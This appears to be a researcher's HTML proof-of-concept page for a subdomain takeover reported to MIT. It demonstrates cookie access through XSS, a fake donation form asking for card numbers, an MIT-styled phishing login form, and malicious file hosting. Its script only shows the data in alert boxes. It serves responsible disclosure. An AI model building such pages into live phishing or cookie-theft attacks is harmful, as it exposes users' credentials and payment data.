# Subdomain Takeover Proof of Concept
## By c0d3d_v3n0m (Ali Salman)

The examples below illustrate exploits that may be possible through a Subdomain Takeover Vulnerability. This vulnerability is a high-risk issue and can serve as an attack vector for further exploitation. The purpose of this Proof of Concept is to bring to notice of MIT the severity of the vulnerability. I do not intend to use this for any malignant purposes.
**Please reference: Incident Reference Number To Be Added**

If you have any queries please reach out to [c0d3d_v3n0m (Ali Salman)](mailto:alisalmanbilal@live.com)

<h2>Examples of Exploits:</h2>
<br />
<ol>
<li>
<h4>Stealing Cookies Using XSS (Cross Site Scripting)</h4>
<button type="button" onclick="xss()" class="btn btn-primary">
Click Me!
</button>
</li>
<br />
<li>
<h4>Hosting Scams</h4>
<form>
<div class="form-group w-50">
<label for="fname">First name:</label>
<input
type="text"
id="fname"
name="fname"
class="form-control"
placeholder="John"
/><br />
<label for="lname">Last name:</label>
<input
type="text"
id="lname"
name="lname"
class="form-control"
placeholder="Doe"
/><br />
<label for="donation">Donation Amount:</label>
<input
type="text"
id="donation"
name="donation"
class="form-control"
placeholder="$1000"
/><br />
<label for="card">Credit Card Number:</label>
<input
type="text"
id="card"
name="card"
class="form-control"
placeholder="1111-2222-3333-4444"
/>
</div>
<button type="button" onclick="scam()" class="btn btn-primary">
Get Scammed!
</button>
</form>
<br />
</li>
<li>
<h4>Making Believable Phishing Pages</h4>

<form action="">
<div class="form-group w-50">
<label for="username" id="loginIdLabel"
>Login Name (in the form of an email address):</label
><br />
<input
id="username"
size="40"
maxlength="100"
tabindex="11"
type="text"
accesskey="u"
path="username"
autocomplete="off"
htmlEscape="true"
placeholder="me@examplemailprovider.com"
name="username"
value="Legit MIT Username"
class="form-control"
/><br />
<label for="password" id="PINLabel">Password:</label><br />
<input
id="password"
size="40"
maxlength="100"
tabindex="12"
path="password"
type="password"
accesskey="p"
htmlEscape="true"
autocomplete="off"
name="password"
value="Legit MIT Password"
class="form-control"
/>
</div>
<button type="button" onclick="login()" class="btn btn-primary">
Login
</button>
</form>
<br />
</li>
<li>
<h4>Hosting Malicious Files</h4>
<img
src="https://opensource.com/sites/default/files/uploads/linux-toy-nyancat-animated.gif"
width="50%"
/>
<p><em>Pretend the cat is a malicious file :)</em></p>
</li>
</ol>

<script>
function set() {
document.domain = "mit.edu";
}
function xss() {
alert("A Wild Cookie Appears:\n" + document.cookie);
}
function scam() {
alert("Current Bank Balance = 0 :O");
}
function login() {
var user = document.getElementById("username").value;
var pass = document.getElementById("password").value;
alert(
`The Stolen Login Details Are:\nUsername: ${user}\nPassword: ${pass}`
);
}
</script>
</body>
</html>